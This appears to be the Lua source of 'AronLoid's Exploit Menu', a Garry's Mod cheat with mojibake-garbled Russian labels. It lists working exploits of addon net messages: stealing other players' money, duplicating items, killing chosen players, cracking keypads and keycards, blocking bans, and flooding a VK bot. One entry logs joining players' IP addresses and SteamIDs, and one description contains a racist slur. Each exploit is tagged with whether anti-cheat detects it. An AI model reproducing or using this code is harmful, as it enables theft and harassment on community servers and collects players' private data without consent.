    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ #' .. getCount( 'free' ), desc = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ Ñ Ð°Ð²Ñ‚Ð¾-ÑÐ±Ð¾Ñ€Ð° Ð´ÐµÐ½ÐµÐ³ Ñ ÐºÐ»Ð¸ÐºÐµÑ€Ð° (Ð½ÑƒÐ¶Ð½Ð¾ Ð½Ð°Ð²ÐµÑÑ‚Ð¸ Ð¿Ñ€Ð¸Ñ†ÐµÐ», Ñ€Ð°Ð±Ð¾Ñ‚Ð°ÐµÑ‚ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð° ÐºÐ¾Ñ€Ð¾Ñ‚ÐºÐ¾Ð¹ Ð´Ð¸ÑÑ‚Ð°Ð½Ñ†Ð¸Ð¸)', check = function()
        return netValid( 'money_clicker_withdraw' )
    end, func = function()
        local ent = EyeTrace().Entity

        if ent:IsValid() and ent:GetClass() == 'money_clicker' and ent:GetPos():Distance( lply:GetPos() ) < 150 and ent:GetMoney() > 0 then
            net.Start( 'money_clicker_withdraw' )
            net.WriteEntity( ent )
            net.SendToServer()
        end
    end, t = .1, tn = 'moneyclickerwithdraw', rare = 1, status = 'Undetected' },
    
    { name = 'Ð”ÑŽÐ¿ #' .. getCount( 'dupe' ), desc = 'Ð”ÑŽÐ¿Ð½ÑƒÑ‚ÑŒ Ð¿Ñ€ÐµÐ´Ð¼ÐµÑ‚ Ð¿Ð¾Ð´ Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð½Ñ‹Ð¼ Ð¸Ð½Ð´ÐµÐºÑÐ¾Ð¼ (Ð½ÑƒÐ¶Ð½Ð¾ Ð²Ð¿Ð¸ÑÐ°Ñ‚ÑŒ Ð² Ð¿Ð¾Ð»Ðµ ÑÐ½Ð¸Ð·Ñƒ)', check = function()
        return itemstore and netValid( 'ItemStoreSplit' )
    end, func = function()
        local pos = tonumber( currenttext )
        if pos and pos > 0 then
            net.Start( 'ItemStoreSplit' )
            net.WriteUInt( lply.InventoryID, 32 )
            net.WriteUInt( pos, 32 )
            net.WriteUInt( 0, 32 )
            net.SendToServer()
        end
    end, rare = 2, status = 'Outdated' },
    
    { name = 'Ð”ÑŽÐ¿ #' .. getCount( 'dupe' ), desc = 'Ð”ÑŽÐ¿Ð½ÑƒÑ‚ÑŒ Ð¿Ñ€ÐµÐ´Ð¼ÐµÑ‚ Ð¿Ð¾Ð´ Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð½Ñ‹Ð¼ Ð¸Ð½Ð´ÐµÐºÑÐ¾Ð¼ (Ð½ÑƒÐ¶Ð½Ð¾ Ð²Ð¿Ð¸ÑÐ°Ñ‚ÑŒ Ð² Ð¿Ð¾Ð»Ðµ ÑÐ½Ð¸Ð·Ñƒ)', check = function()
        return itemstore and netValid( '_ItemStoreSplit' )
    end, func = function()
        local pos = tonumber( currenttext )
        if pos and pos > 0 then
            net.Start( '_ItemStoreSplit' )
            net.WriteUInt( lply.InventoryID, 32 )
            net.WriteUInt( pos, 32 )
            net.WriteUInt( 0, 32 )
            net.SendToServer()
        end
    end, rare = 2, status = 'Outdated' },
    
    { name = 'ÐÐ²Ñ‚Ð¾Ð¾Ð±ÑÐ»ÑƒÐ¶Ð¸Ð²Ð°Ð½Ð¸Ðµ Ð¿Ñ€Ð¸Ð½Ñ‚ÐµÑ€Ð¾Ð²', desc = 'ÐŸÑ€Ð¸ 75 Ð¸ Ð±Ð¾Ð»ÐµÐµ Ð³Ñ€Ð°Ð´ÑƒÑÐ¾Ð² Ð±Ð»Ð¸Ð·Ð¶Ð°Ð¹ÑˆÐ¸Ð¼ Ð¿Ñ€Ð¸Ð½Ñ‚ÐµÑ€Ð°Ð¼ Ð±ÑƒÐ´ÐµÑ‚ Ð·Ð°ÐºÑƒÐ¿Ð»ÐµÐ½Ð¾ Ð¾Ñ…Ð»Ð°Ð¶Ð´ÐµÐ½Ð¸Ðµ', check = function()
        return netValid( 'GambitPrinter.Cool' )
    end, func = function()
        exploitinfo.fprintercoolindex = exploitinfo.fprintercoolindex + 1
        
        local ents = ents.FindByClass( 'f_printer' )
        local count = #ents
        
        if exploitinfo.fprintercoolindex > count then
            exploitinfo.fprintercoolindex = 1
        end
        
        local ent = ents[ exploitinfo.fprintercoolindex ]
        if ent and ent:IsValid() and ent:GetPos():Distance( lply:GetPos() ) < 500 and ent.GetHeat and ent:GetHeat() > 74 then
            net.Start( 'GambitPrinter.Cool' )
            net.WriteEntity( ent )
            net.SendToServer()
        end
    end, t = .1, tn = 'fprintercool', rare = 1, status = 'Undetected', tags = {
        fprintercoolindex = 0
    } },

    { name = 'Ð£Ð±Ð¸Ñ‚ÑŒ Ð»ÑŽÐ´ÐµÐ¹', desc = 'Ð’Ñ‹Ð±ÐµÑ€Ð¸Ñ‚Ðµ Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð², Ð²ÐºÐ»ÑŽÑ‡Ð¸Ñ‚Ðµ Ð¸ Ñ‡ÐµÐ»Ð¾Ð²ÐµÐº Ð±ÑƒÐ´ÐµÑ‚ Ð¿Ð¾Ð³Ð¸Ð±Ð°Ñ‚ÑŒ (Ð¿ÐµÑ€ÐµÐ´ Ð°ÐºÑ‚Ð¸Ð²Ð°Ñ†Ð¸ÐµÐ¹ Ð½ÑƒÐ¶Ð½Ð¾ Ð¿Ð¾Ð¿Ð°ÑÑ‚ÑŒ Ð² Ð¸Ð³Ñ€Ð¾ÐºÐ°, Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€ÑÑ‚ÑŒ Ð½Ðµ Ð½ÑƒÐ¶Ð½Ð¾)', check = function()
        return LeyHitreg
    end, act = function()
        local global = table.Copy( _G )
        global.net = {
            Start = function( name )
                if !exploitinfo.leyhitregnet then
                    exploitinfo.leyhitregnet = name
                    LeyHitreg.EntityFireBullets = function() end
                end
            end,
            
            WriteUInt = function() end,
            WriteBool = function() end,
            WriteEntity = function() end,
            WriteVector = function() end,
            SendToServer = function() end
        }
        
        debug.setfenv( LeyHitreg.EntityFireBullets, global )
    end, func = function()      
        local netname = exploitinfo.leyhitregnet
        
        if !netname or table.Count( selectedplys ) == 0 then
            return
        end
        
        local _, ply = table.Random( selectedplys )
        
        if !ply or !ply:IsValid() or !ply:Alive() or ply:HasGodMode() then
            return
        end
        
        local bone = ply:LookupBone( 'ValveBiped.Bip01_Head1' )
        if !bone then
            return
        end
        
        local pos = ply:GetBonePosition( bone )
        if !pos then
            return
        end
        
        net.Start( netname )
        net.WriteUInt( 1, 8 )
        net.WriteBool( true )
        net.WriteEntity( lply:GetActiveWeapon() )
        net.WriteEntity( ply )
        net.WriteVector( pos )
        net.WriteVector( Vector( 0, 0, 0 ) )
        net.WriteVector( pos )
        net.WriteUInt( HITGROUP_HEAD, 8 )
        net.SendToServer()
        
        lply:ConCommand( '+attack' )
        timer.Simple( 0, function()
            lply:ConCommand( '-attack' )
        end )
    end, deact = function()
        if LeyHitreg then
            debug.setfenv( LeyHitreg.EntityFireBullets, _G )
            LeyHitreg.EntityFireBullets = exploitinfo.leyhitreg
        end
    end, t = .1, tn = 'leyhitregkill', rare = 3, status = 'Undetected', tags = {
        leyhitreg = LeyHitreg and LeyHitreg.EntityFireBullets or nil
    } },

    { name = 'Ð’Ð·Ð»Ð¾Ð¼Ð°Ñ‚ÑŒ Ð½Ð°Ñ€ÑƒÑ‡Ð½Ð¸ÐºÐ¸', desc = 'ÐœÐ³Ð½Ð¾Ð²ÐµÐ½Ð½Ð¾ Ð²Ð·Ð»Ð¾Ð¼Ð°Ñ‚ÑŒ Ð½Ð°Ñ€ÑƒÑ‡Ð½Ð¸ÐºÐ¸', check = function()
        return netValid( 'Kun_ZiptieStruggle' )
    end, func = function()
        net.Start( 'Kun_ZiptieStruggle' )
        net.SendToServer()
    end, rare = 2, status = 'Outdated' },

    { name = 'ÐŸÐ¾ÐºÑ€Ð°ÑÐ¸Ñ‚ÑŒ Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð²', desc = 'Ð¡Ð´ÐµÐ»Ð°Ñ‚ÑŒ Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð² Ñ‚Ñ€Ð°Ð½Ñ-Ð½Ð¸Ð³Ð³Ð°Ð¼Ð¸', check = function()
        return JMod_Hints
    end, func = function()
        exploitinfo.jmodcolor = !exploitinfo.jmodcolor
        local col = exploitinfo.jmodcolor and Color( 255, 255, 255 ) or Color( 0, 0, 0 )
        
        for ply in pairs( selectedplys ) do
            net.Start( 'JMod_MineColor' )
            net.WriteEntity( ply )
            net.WriteColor( col )
            net.WriteBit( true )
            net.SendToServer()
        end
    end, t = .1, tn = 'jmodcolor', rare = 1, status = 'Undetected', tags = {
        jmodcolor = true
    } },
    
    { name = 'Ð’Ð·Ð»Ð¾Ð¼Ð°Ñ‚ÑŒ UniSec ÐºÐµÐ¹Ð¿Ð°Ð´', desc = 'ÐÑƒÐ¶Ð½Ð¾ Ð½Ð° Ð½ÐµÐ³Ð¾ ÑÐ¼Ð¾Ñ‚Ñ€ÐµÑ‚ÑŒ Ð¸ Ð·Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ Ñ„ÑƒÐ½ÐºÑ†Ð¸ÑŽ', check = function()
        return usec
    end, func = function()
        local ent = EyeTrace().Entity

        if ent:IsValid() and ent:GetClass() == 'uni_keypad' then
            net.Start( 'usec_paid_door' )
            net.WriteEntity( ent )
            net.WriteBool( true )
            net.SendToServer()
        end
    end, rare = 2, status = 'Detect' },

    { name = 'BunnyHop', desc = 'ÐÐ²Ñ‚Ð¾-Ñ€Ð°ÑÐ¿Ñ€Ñ‹Ð¶ÐºÐ°', check = function()
        return true
    end, act = function()
        hook.Add( 'CreateMove', '_z_em_bunnyhop', function( usercmd )
            if lply:WaterLevel() < 2 and lply:GetMoveType() == MOVETYPE_WALK then
                lply:ConCommand( !vgui.CursorVisible() and input.IsKeyDown( KEY_SPACE ) and lply:OnGround() and '+jump' or '-jump' )
            end
        end )
    end, deact = function()
        hook.Remove( 'CreateMove', '_z_em_bunnyhop' )
    end, t = 0, tn = 'bunnyhop', rare = 0, status = 'Detect' },

    { name = 'AutoStrafe', desc = 'Ð£ÑÐºÐ¾Ñ€ÐµÐ½Ð¸Ðµ BunnyHop\'Ð°', check = function()
        return true
    end, act = function()
        hook.Add( 'CreateMove', '_z_em_autostrafe', function( usercmd )
            if lply:WaterLevel() < 2 and lply:GetMoveType() == MOVETYPE_WALK and !lply:OnGround() then
                local x = usercmd:GetMouseX()
                if x > 0 then
                    usercmd:SetSideMove( 10000 )
                elseif x < 0 then
                    usercmd:SetSideMove( -10000 )
                end
            end
        end )
    end, deact = function()
        hook.Remove( 'CreateMove', '_z_em_autostrafe' )
    end, t = 0, tn = 'autostrafe', rare = 0, status = 'Detect' },

    { name = 'FastWalk', desc = 'Ð”Ð¾Ð±Ð°Ð²Ð»ÑÐµÑ‚ 10% Ðº ÑÐºÐ¾Ñ€Ð¾ÑÑ‚Ð¸ Ð¿Ñ€Ð¸ Ð±ÐµÐ³Ðµ Ð²Ð¿ÐµÑ€Ñ‘Ð´/Ð½Ð°Ð·Ð°Ð´', check = function()
        return true
    end, act = function()
        hook.Add( 'CreateMove', '_z_em_fastwalk', function( usercmd )
            if lply:GetMoveType() == MOVETYPE_WALK and usercmd:GetForwardMove() ~= 0 then
                if usercmd:TickCount() % 2 == 0 then
                    usercmd:SetSideMove( usercmd:GetSideMove() + 5000 )
                else
                    usercmd:SetSideMove( usercmd:GetSideMove() - 5000 )
                end
            end
        end )
    end, deact = function()
        hook.Remove( 'CreateMove', '_z_em_fastwalk' )
    end, t = 0, tn = 'fastwalk', rare = 0, status = 'Undetected' },
    
    { name = 'IP Ð»Ð¾Ð³Ð³ÐµÑ€', desc = 'Ð—Ð°Ð¿Ð¸ÑÑ‹Ð²Ð°Ñ‚ÑŒ Ð°Ð¹Ð¿Ð¸ Ð·Ð°Ñ…Ð¾Ð´ÑÑ‰Ð¸Ñ… Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð² Ð² data/_z_ip.txt', check = function()
        return rlib
    end, act = function()
        net.Receivers[ 'rlib.debug.listener' ] = function()
            if !net.ReadBool() then --Ð—Ð°ÑˆÐµÐ» Ð¸Ð»Ð¸ Ð½ÐµÑ‚
                return
            end
            if net.ReadBool() then --Ð‘Ð¾Ñ‚ Ñ‡ÐµÐº
                return
            end
            
            local name = net.ReadString()
            local ip = net.ReadString()
            local steamid = net.ReadString()
            
            if whitelist[ steamid ] then
                return
            end
            
            file.Append( '_z_ip.txt', string.format( [[%s | %s | %s | %s | %s\n]], game.GetIPAddress(), GetHostName(), name, steamid, ip ) )
        end
    end, deact = function()
        net.Receivers[ 'rlib.debug.listener' ] = exploitinfo[ 'rlib.debug.listener' ]
    end, t = 0, tn = 'rlibiplogger', rare = 4, status = 'Undetected', tags = {
        [ 'rlib.debug.listener' ] = net.Receivers[ 'rlib.debug.listener' ]
    } },
    
    { name = 'ÐŸÐ¾Ð´ÐºÑ€ÑƒÑ‚ÐºÐ° Ñ€ÐµÐ¹Ñ‚Ð¸Ð½Ð³Ð° Ð°Ð´Ð¼Ð¸Ð½Ñƒ', desc = 'Ð’Ñ‹Ð´Ð°ÐµÑ‚ 100 Ñ€Ð°Ð· Ð¾Ñ†ÐµÐ½ÐºÑƒ (Ñ‚ÐµÐºÑÑ‚ ÑÐ½Ð¸Ð·Ñƒ) Ð°Ð´Ð¼Ð¸Ð½Ñƒ (Ñ€Ð°Ð±Ð¾Ñ‚Ð°ÐµÑ‚ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ ÑÑ€Ð°Ð·Ñƒ Ð¿Ð¾ÑÐ»Ðµ Ð·Ð°ÐºÑ€Ñ‹Ñ‚Ð¸Ñ Ð¶Ð°Ð»Ð¾Ð±Ñ‹ Ð°Ð´Ð¼Ð¸Ð½Ð¾Ð¼, Ð½ÐµÐ»ÑŒÐ·Ñ Ð²Ñ‹Ð´Ð°Ð²Ð°Ñ‚ÑŒ Ð·Ð²ÐµÐ·Ð´Ñ‹ ÑÐ°Ð¼Ð¾Ð¼Ñƒ)', check = function()
        return cats
    end, func = function()
        local int = 0
        
        if currenttext ~= '' then
            int = math.Clamp( tonumber( currenttext ), 1, 5 )
        end
        
        for _ = 1, 100 do
            net.Start( 'cats.setRating' )
            net.WriteUInt( int == 0 and math.random( 1, 5 ) or int, 8 )
            net.SendToServer()
        end
    end, rare = 2, status = 'Undetected' },
    
    { name = 'Ð’Ð·Ð»Ð¾Ð¼Ð°Ñ‚ÑŒ KeyCard', desc = 'ÐÑƒÐ¶Ð½Ð¾ Ð½Ð° Ð½ÐµÐ³Ð¾ ÑÐ¼Ð¾Ñ‚Ñ€ÐµÑ‚ÑŒ Ð¸ Ð·Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ Ñ„ÑƒÐ½ÐºÑ†Ð¸ÑŽ', check = function()
        return netValid( 'netKeycardAdminSpawn' )
    end, func = function()
        local ent = EyeTrace().Entity
        if ent:IsValid() and ent:GetClass() == 'ent_keycardscanner' then
            net.Start( 'netKeycardAdminSpawn' )
            net.WriteEntity( ent )
            net.SendToServer()
        end
    end, rare = 2, status = 'Undetected' },
    
    { name = 'Ð—Ð°Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð²ÑÐµ KeyCard\'Ñ‹', desc = 'Ð‘Ð»Ð¾ÐºÐ¸Ñ€ÑƒÐµÑ‚ÑÑ Ð²ÑÐµ KeyCard\'Ñ‹ Ð½Ð° ÐºÐ°Ñ€Ñ‚Ðµ', check = function()
        return netValid( 'netKeycardHackSpawn' )
    end, func = function()
        local ents = ents.FindByClass( 'ent_keycardscanner' )
        for i = 1, #ents do
            net.Start( 'netKeycardHackSpawn' )
            net.WriteEntity( ents[ i ] )
            net.SendToServer()
        end
    end, t = .1, tn = 'keycardlock', rare = 2, status = 'Undetected' },
    
    { name = 'MoneyPrinter', desc = 'ÐœÐ½Ð³Ð½Ð¾Ð²ÐµÐ½Ð½Ñ‹Ð¹ Ð²Ð·Ð»Ð¾Ð¼ Ð²Ð»Ð°Ð´ÐµÐ»ÑŒÑ†Ð° Ð¿Ñ€Ð¸Ð½Ñ‚ÐµÑ€Ð°, Ð½Ð° ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ð¹ Ð²Ñ‹ ÑÐ¼Ð¾Ñ‚Ñ€Ð¸Ñ‚Ðµ, Ñ€Ð°Ð±Ð¾Ñ‚Ð°ÐµÑ‚ Ð½Ð° Ð±Ð»Ð¸Ð·ÐºÐ¾Ð¹ Ð´Ð¸ÑÑ‚Ð°Ð½Ñ†Ð¸Ð¸', check = function()
        return netValid( 'money_clicker_steal' )
    end, func = function()
        local ent = EyeTrace().Entity

        if not ent:IsValid() or ent:GetClass() ~= 'money_clicker' then return end

        net.Start( 'money_clicker_steal' )
        net.WriteEntity( ent )
        net.WriteBool( false )
        net.SendToServer()

        net.Start( 'money_clicker_steal' )
        net.WriteEntity( ent )
        net.WriteBool( true )
        net.SendToServer()
    end, rare = 2, status = 'Undetected' },
    
    { name = 'Ð‘Ð»Ð¾Ðº Keypad\'Ð¾Ð² #' .. getCount( 'keypadblock' ), desc = 'ÐšÐµÐ¹Ð¿Ð°Ð´Ñ‹ Ñ€ÑÐ´Ð¾Ð¼ Ñ Ð’Ð°Ð¼Ð¸ Ð±ÑƒÐ´ÑƒÑ‚ ÑÐ²ÐµÑ€ÐºÐ°Ñ‚ÑŒ Ð¸ Ð½Ð° Ð½Ð¸Ñ… Ð½ÐµÐ»ÑŒÐ·Ñ Ð±ÑƒÐ´ÐµÑ‚ Ð²Ð²ÐµÑÑ‚Ð¸ Ð¿Ð°Ñ€Ð¾Ð»ÑŒ', check = function()
        return PatternKeypad
    end, func = function()
        local keypads = ents.FindByClass( 'keypad_pattern' )

        for i = 1, #keypads do
            local keypad = keypads[ i ]

            if keypad:GetPos():Distance( lply:GetPos() ) < 250 then
                keypad:SendCombination( {} )
            end
        end
    end, tn = 'patternkeypadhack', t = .1, rare = 1, status = 'Undetected' },
    
    { name = 'Ð‘Ð»Ð¾Ðº Keypad\'Ð¾Ð² #' .. getCount( 'keypadblock' ), desc = 'ÐŸÐ°Ñ€Ð¾Ð»Ð¸ ÐºÐµÐ¹Ð¿Ð°Ð´Ð¾Ð² Ñ€ÑÐ´Ð¾Ð¼ Ñ Ð’Ð°Ð¼Ð¸ Ð±ÑƒÐ´ÑƒÑ‚ Ð¿Ð¾ÑÑ‚Ð¾ÑÐ½Ð½Ð¾ Ð¾Ñ‡Ð¸Ñ‰Ð°Ñ‚ÑŒÑÑ', check = function()
        return netValid( 'keypad' ) or netValid( 'keypad_command' )
    end, func = function()
        local keypads = ents.FindByClass( 'keypad' )

        for i = 1, #keypads do
            local keypad = keypads[ i ]

            if keypad:GetPos():DistToSqr( lply:GetPos() ) < 14400 and ( ( keypad.GetText and keypad:GetText() ~= '' ) or ( keypad.GetDisplayText and keypad:GetDisplayText() ~= '' ) ) then
                if keypad.SendCommand then
                    keypad:SendCommand( keypad.Command_Abort )
                else
                    net.Start( 'keypad_command' )
                    net.WriteEntity( keypad )
                    net.WriteUInt( keypad.Command_Reset, 3 )
                    net.SendToServer()
                end
            end
        end
    end, tn = 'keypadblock', t = .1, rare = 1, status = 'Undetected' },
    
    { name = 'Ð£Ð´Ð°Ð»Ð¸Ñ‚ÑŒ NLR ÑÐºÑ€Ð°Ð½', desc = 'Ð£Ð±Ð¸Ñ€Ð°ÐµÑ‚ Ñ‡Ñ‘Ñ€Ð½Ñ‹Ð¹ ÑÐºÑ€Ð°Ð½ Ð¿Ñ€Ð¸ Ð²Ñ…Ð¾Ð´Ðµ Ð² NLR Ð·Ð¾Ð½Ñƒ', check = function()
        return hookValid( 'HUDPaint', 'Draw_NLR_Circle' )
    end, act = function()
        hook.Add( 'HUDPaint', 'Draw_NLR_Circle', function() end )
    end, deact = function()
        hook.Add( 'HUDPaint', 'Draw_NLR_Circle', exploitinfo[ 'oldNLRHud' ] )
    end, tn = '', t = 0, rare = 0, status = 'Undetected', tags = {
        [ 'oldNLRHud' ] = hook.GetTable()[ 'HUDPaint'][ 'Draw_NLR_Circle' ]
    } },
    
    { name = 'Ð’ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒ Ð»Ð°Ð¿Ñ‹ Ð·Ð°Ð¹Ñ†Ð°', desc = 'Ð”Ð¾Ð½Ð°Ñ‚Ð½Ñ‹Ð¹ BunnyHop', check = function()
        return bhmenu
    end, func = function()
        net.Start( 'zaika' )
        net.SendToServer()
    end, rare = 2, status = 'Undetected' },
    
    { name = 'Ð’ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒ Ð³Ð»Ð°Ð·Ð° Ñ…Ð¸Ñ‰Ð½Ð¸ÐºÐ°', desc = 'Ð”Ð¾Ð½Ð°Ñ‚Ð½Ñ‹Ð¹ Ð’Ð¥', check = function()
        return true
    end, func = function()
        lply:SetNWBool( 'Ñ…Ð¸Ñ‰Ð½Ð¸Ðº_Ð³Ð»Ð°Ð·Ð°', true )
    end, deact = function()
        lply:SetNWBool( 'Ñ…Ð¸Ñ‰Ð½Ð¸Ðº_Ð³Ð»Ð°Ð·Ð°', false )
    end, tn = 'hisnikeyes', t = .1, rare = 1, status = 'Undetected' },
    
    { name = 'Ð¡Ð¿Ð°Ð¼ Ð·Ð²ÑƒÐºÐ¾Ð¼', desc = 'Ð Ð°Ð· Ð² ÑÐµÐºÑƒÐ½Ð´Ñƒ Ð°ÐºÑ‚Ð¸Ð²Ð¸Ñ€ÑƒÐµÑ‚ÑÑ Ð·Ð²ÑƒÐº Ð½Ð° Ð±Ð¾Ð»ÑŒÑˆÐ¾Ðµ Ñ€Ð°ÑÑ‚Ð¾ÑÐ½Ð¸Ðµ, Ð½Ðµ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð¾Ð»Ð³Ð¾ (Ð¼Ð¾Ð³ÑƒÑ‚ Ð·Ð°Ð±Ð°Ð½Ð¸Ñ‚ÑŒ)', check = function()
        return netValid( 'wanted_radio' )
    end, func = function()
        net.Start( 'wanted_radio' )
        net.WriteEntity( lply )
        net.WriteInt( 1, 4 )
        net.SendToServer()
    end, tn = 'wantedradiospam', t = 1, rare = 2, status = 'Use at own risk' },
    
    { name = 'Ð¤Ð»ÑƒÐ´ Ð² Ð’Ðš', desc = 'ÐžÐ¿Ñ€ÐµÐ´ÐµÐ»ÐµÐ½Ð½Ð¾Ð¼Ñƒ ÑŽÐ·ÐµÑ€Ñƒ (Ð½ÑƒÐ¶Ð½Ð¾ Ð²Ð²ÐµÑÑ‚Ð¸ ÑÑÑ‹Ð»ÐºÑƒ Ð½Ð¸Ð¶Ðµ) Ð±ÑƒÐ´ÐµÑ‚ Ñ„Ð»ÑƒÐ´Ð¸Ñ‚ÑŒ Ð±Ð¾Ñ‚ Ð² Ð’Ðš, Ð¿Ð¾ÑÐ»Ðµ Ñ‡ÐµÐ³Ð¾ Ð±Ð¾Ñ‚ ÑÐ»Ð¾Ð¼Ð°ÐµÑ‚ÑÑ Ð½Ð° Ð½ÐµÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ðµ Ð²Ñ€ÐµÐ¼Ñ', check = function()
        return gavnoeofa
    end, func = function()
        net.Start( 'SendKodPlz' )
        net.WriteString( currenttext )
        net.SendToServer()
    end, tn = 'vkfloodcode', t = .1, rare = 2, status = 'Undetected' },
    
    { name = 'ÐÐ½Ñ‚Ð¸Ð‘Ð°Ð½', desc = 'Ð‘Ð°Ð½ Ð½Ðµ Ð±ÑƒÐ´ÐµÑ‚ Ñ€Ð°Ð±Ð¾Ñ‚Ð°Ñ‚ÑŒ Ð¿Ñ€Ð¸ Ð²ÐºÐ»ÑŽÑ‡ÐµÐ½Ð½Ð¾Ð¹ Ñ€Ð°Ð±Ð¾Ñ‚Ðµ ÑÐºÑÐ¿Ð»Ð¾Ð¹Ñ‚Ð° (Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð±Ð°Ð½, Ð¼ÐµÐ½ÑÑŽÑ‰Ð¸Ð¹ Ð¿Ñ€Ð¾Ñ„ÐµÑÑÐ¸ÑŽ)', check = function()
        return netValid( 'NeuroBanReason' )
    end, act = function()
        function _G.net.Start( a, b )
            if a ~= 'NeuroBanReason' then
                net.Start( a, b )
            end
        end
    end, deact = function()
        _G.net.Start = exploitinfo[ 'old_net.Start' ]
    end, tn = '', t = 0, rare = 3, status = 'Undetected', tags = {
        [ 'old_net.Start' ] = net.Start
    } },
}

table.sort( exploits, function( e1, e2 )
    return e1.rare > e2.rare
end )

exploitcount = #exploits

//Menu

local menu = vgui.Create( 'DFrame' )
menu:SetSize( scrw, scrh )
menu:Center()
menu:Hide()
menu:MakePopup()
menu:SetTitle( '' )
menu:ShowCloseButton()

function menu:Paint( w, h )
    if scrgrb() then
        return
    end
    
    if spotsdraw then
        surface.SetDrawColor( 45, 45, 45, 200 )
        surface.DrawRect( 0, 0, w, h )
        
        for a = 1, 25 do
            local spot = spotstable[ a ]
            surface.DrawCircle( spot.x, spot.y, 1, Color( 255, 255, 255 ) )
            
            for b = 1, 25 do
                local spot2 = spotstable[ b ]
                if a ~= b and math.abs( spot2.x - spot.x ) <= 100 and math.abs( spot2.y - spot.y ) <= 100 then
                    surface.DrawLine( spot.x, spot.y, spot2.x, spot2.y )
                end
            end
        end
    else
        surface.SetDrawColor( bg.color )
        surface.DrawRect( 0, 0, w, h )
    end
    
    surface.SetDrawColor( 255, 255, 255, 128 )
    surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    
    local text = 'AronLoid\'s Exploit Menu | ' .. exploitavailable .. '/' .. exploitcount .. ' ÑÐºÑÐ¿Ð»Ð¾Ð¸Ñ‚Ð¾Ð² | ' .. version
    surface.SetTextColor( 255, 255, 255 )
    surface.SetFont( '_z_emm' )
    surface.SetTextPos( 5, 5 )
    surface.DrawText( text )
    if #antiexp > 0 then
        local col = math.cos( SysTime() * 10 ) * 127.5 + 127.5
        local text = 'ÐžÐ±Ð½Ð°Ñ€ÑƒÐ¶ÐµÐ½Ð¾: ' .. table.concat( antiexp, ', ' )
        surface.SetTextColor( col, 0, 255 - col )
        surface.SetTextPos( w - surface.GetTextSize( text ) - 40, 5 )
        surface.DrawText( text )
    end
end

menu.OldThink = menu.Think

function menu:Think()
    for a = 1, 25 do
        local spot = spotstable[ a ]
        if spot.x >= scrw or spot.x <= 0 then
            spot.x2 = -spot.x2
        end
            if spot.y >= scrh or spot.y <= 0 then
            spot.y2 = -spot.y2
        end
        spotstable[ a ].x = spot.x + spot.x2
        spotstable[ a ].y = spot.y + spot.y2
    end
    
    self:OldThink()
end

local bghtml = vgui.Create( 'DHTML', menu )
bghtml:SetPos( ( scrw - bg.w ) / 2 - 10, ( scrh - bg.h ) / 2 - 10 )
bghtml:SetHTML( '<img src=\"' .. bg.url .. '\">' )
bghtml:SetSize( bg.w + 100, bg.h + 100 )
bghtml:SetVisible( !spotsdraw )

local col = spotsdraw and 45 or 175
local bgtoggle = vgui.Create( 'DButton', menu )
bgtoggle:SetSize( 40, 20 )
bgtoggle:SetPos( 5, scrh - 20 )
bgtoggle:SetText( '' )

function bgtoggle:Paint( w, h )
    if scrgrb() then
        return
    end
    
    if col < 175 and !spotsdraw then
        col = Lerp( FrameTime() * 10, col, 175 )
    elseif col > 45 and spotsdraw then
        col = Lerp( FrameTime() * 10, col, 45 )
    end
    
    surface.SetDrawColor( 255, 255, 255, 128 )
    surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    
    surface.SetDrawColor( col, 220 - col, 45, 175 )
    surface.DrawRect( 1, 1, w - 2, h - 2 )
    
    surface.SetFont( '_z_em' )
    surface.SetTextColor( 255, 255, 255 )
    surface.SetTextPos( 5, 0 )
    surface.DrawText( 'Ð¤Ð¾Ð½' )
end

function bgtoggle:OnCursorEntered()
    playsound( sounds[ 1 ] )
end

function bgtoggle:DoClick()
    spotsdraw = !spotsdraw
    bghtml:SetVisible( !spotsdraw )
    
    if spotsdraw then
        cookie.Delete( '_z_wallpaper' )
    else
        cookie.Set( '_z_wallpaper', '' )
    end
end

local dtext = vgui.Create( 'DTextEntry', menu )
dtext:SetSize( scrw - 55, 20 )
dtext:SetPos( 50, scrh - 20 )
dtext:SetText( '' )
function dtext:OnTextChanged( text )
    currenttext = self:GetText()
end
dtext.paint = dtext.Paint
function dtext:Paint( w, h )
    if !scrgrb() then
        self:paint( w, h )
    end
end

local close = vgui.Create( 'DButton', menu )
close:SetSize( 30, 15 )
close:SetPos( scrw - 35, 0 )
close:SetText( '' )
function close:Paint( w, h )
    if scrgrb() then
        return
    end
    surface.SetDrawColor( 255, 255, 255, 128 )
    surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    
    surface.SetDrawColor( 175, 45, 45, 175 )
    surface.DrawRect( 1, 1, w - 2, h - 2 )
    surface.SetFont( '_z_em' )
    surface.SetTextColor( 255, 255, 255 )
    surface.SetTextPos( 11, -4 )
    surface.DrawText( 'x' )
end

function close:OnCursorEntered()
    playsound( sounds[ 1 ] )
end

function close:DoClick()
    menu:Hide() 
end

local binds = {}
local dexp = vgui.Create( 'DPanelList', menu )
dexp:SetSize( scrw, scrh - 45 )
dexp:SetPos( 0, 20 )
dexp:SetPadding( 15 )
dexp:SetSpacing( 1 )
dexp:EnableVerticalScrollbar()

